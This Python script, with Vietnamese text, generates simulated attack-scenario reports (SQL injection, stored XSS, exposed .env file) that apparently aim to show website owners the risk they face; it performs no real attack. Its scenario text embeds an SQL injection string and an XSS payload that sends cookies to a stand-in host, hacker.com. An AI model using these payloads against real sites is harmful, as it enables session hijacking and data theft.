import sys
import time
import os
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init

init(autoreset=True)

# BIẾN LƯU KỊCH BẢN
SCENARIO_LOG = []

def print_banner():
    print(Fore.RED + """
    =======================================================
    SECURITY TOOL V6 - ATTACK SCENARIO GENERATOR
    (Mô phỏng kịch bản tấn công & Thiệt hại dữ liệu)
    Level: Expert Consultant | Coder: Người anh em
    =======================================================
    """)

def log_step(step_name, detail, impact):
    entry = f"""
[BƯỚC TẤN CÔNG]: {step_name}
------------------------------------------------
- Hành động: {detail}
- Dữ liệu bị ảnh hưởng: {impact}
    """
    SCENARIO_LOG.append(entry)
    print(Fore.YELLOW + f"\n[+] Đang mô phỏng bước: {step_name}...")
    time.sleep(1) # Tạo hiệu ứng chờ như đang hack thật
    print(Fore.RED + f"    => {impact}")

# 1. KỊCH BẢN SQL INJECTION (MẤT DỮ LIỆU)
def simulate_sqli(url):
    print(Fore.CYAN + "\n[*] Đang xây dựng kịch bản tấn công SQL Injection...")
    
    # Bước 1: Recon
    log_step(
        "Khai thác điểm yếu (Entry Point)",
        f"Hacker nhập payload `' OR 1=1 --` vào URL: {url}",
        "Vượt qua cơ chế kiểm tra lỗi cú pháp của Database."
    )

    # Bước 2: Bypass Auth
    log_step(
        "Leo thang đặc quyền (Privilege Escalation)",
        "Database hiểu lầm lệnh là 'Chọn tất cả người dùng', không cần mật khẩu.",
        "Hacker đăng nhập thành công vào trang Admin Dashboard mà không cần password."
    )

    # Bước 3: Data Dumping
    log_step(
        "Trích xuất dữ liệu (Data Exfiltration)",
        "Sử dụng công cụ tự động (như SQLMap) để Dump toàn bộ bảng 'Users'.",
        "RÒ RỈ: 10,000+ Email, Mật khẩu (Hash), Số điện thoại khách hàng."
    )

    # Bước 4: Hậu quả kinh doanh
    log_step(
        "Tác động kinh doanh (Business Impact)",
        "Hacker bán dữ liệu lên Dark Web hoặc xóa sạch Database.",
        "THIỆT HẠI: Mất uy tín thương hiệu, bị kiện vì làm lộ thông tin khách hàng, Website ngừng hoạt động."
    )

# 2. KỊCH BẢN XSS (MẤT TÀI KHOẢN KHÁCH HÀNG)
def simulate_xss(url):
    print(Fore.CYAN + "\n[*] Đang xây dựng kịch bản tấn công XSS (Cross-Site Scripting)...")
    
    # Bước 1: Inject
    log_step(
        "Chèn mã độc (Injection)",
        f"Hacker chèn đoạn mã `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>` vào ô bình luận/tìm kiếm.",
        "Mã độc được lưu lại vĩnh viễn trên trang web."
    )

    # Bước 2: Lây nhiễm
    log_step(
        "Lây nhiễm người dùng (Infection)",
        "Khách hàng hoặc Admin truy cập vào trang web đã bị nhiễm mã độc.",
        "Trình duyệt của nạn nhân tự động chạy mã độc mà họ không hề hay biết."
    )

    # Bước 3: Chiếm quyền
    log_step(
        "Chiếm phiên làm việc (Session Hijacking)",
        "Mã độc gửi Cookie/Session ID của Admin về máy chủ của Hacker.",
        "MẤT QUYỀN KIỂM SOÁT: Hacker đăng nhập vào tài khoản Admin, đổi mật khẩu, chiếm đoạt Web."
    )

# 3. KỊCH BẢN LỘ FILE NHẠY CẢM (.ENV)
def simulate_sensitive_file(url):
    print(Fore.CYAN + "\n[*] Đang xây dựng kịch bản lộ thông tin nhạy cảm...")
    
    log_step(
        "Quét tệp tin ẩn",
        f"Hacker tìm thấy file cấu hình tại: {url}/.env",
        "LỘ: DB_PASSWORD, AWS_SECRET_KEY, API_KEYS."
    )
    
    log_step(
        "Tấn công hạ tầng (Infrastructure Attack)",
        "Sử dụng AWS Key để truy cập server cloud của công ty.",
        "NGUY HIỂM CỰC ĐỘ: Hacker có quyền xóa toàn bộ Server, cài mã độc tống tiền (Ransomware)."
    )

# XUẤT FILE MÔ PHỎNG (PROOF OF CONCEPT)
def save_simulation_file(domain):
    filename = f"MO_PHONG_TAN_CONG_{domain}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"BÁO CÁO MÔ PHỎNG TẤN CÔNG MẠNG (CYBER KILL CHAIN)\n")
        f.write(f"Mục tiêu: {domain}\n")
        f.write(f"Cảnh báo: TÀI LIỆU NÀY MÔ TẢ KỊCH BẢN XẤU NHẤT CÓ THỂ XẢY RA.\n")
        f.write("="*60 + "\n\n")
        
        for entry in SCENARIO_LOG:
            f.write(entry + "\n")
            
        f.write("\n" + "="*60 + "\n")
        f.write("KẾT LUẬN: Hệ thống đang đứng trước rủi ro 'RẤT CAO'.\n")
        f.write("Khuyến nghị: Cần vá lỗ hổng ngay lập tức theo hướng dẫn ở Báo cáo V5.\n")
        
    print(Fore.GREEN + f"\n[DONE] Đã xuất file kịch bản: {filename}")
    print(Fore.GREEN + "Gửi file này cho chủ Web để họ thấy viễn cảnh thực tế!")

def main():
    print_banner()
    print("Công cụ này sẽ KHÔNG tấn công thật, mà sẽ tạo ra kịch bản chi tiết.")
    print("Mục đích: Giúp khách hàng hình dung mức độ nguy hiểm.")
    
    target = input(Fore.YELLOW + "\nNhập URL mục tiêu (vd: http://testphp.vulnweb.com): ").strip()
    domain = urlparse(target).netloc
    
    print(Fore.WHITE + "\nChọn loại kịch bản muốn mô phỏng:")
    print("1. SQL Injection (Mất dữ liệu, lộ thông tin khách hàng)")
    print("2. XSS (Chiếm quyền Admin, mất tài khoản)")
    print("3. Sensitive File (Lộ Server, nguy cơ Ransomware)")
    
    choice = input("Chọn kịch bản (1-3): ")
    
    SCENARIO_LOG.clear()
    
    if choice == '1':
        simulate_sqli(target)
    elif choice == '2':
        simulate_xss(target)
    elif choice == '3':
        simulate_sensitive_file(target)
    else:
        print("Lựa chọn không hợp lệ.")
        return

    save_simulation_file(domain)

if __name__ == "__main__":
    main()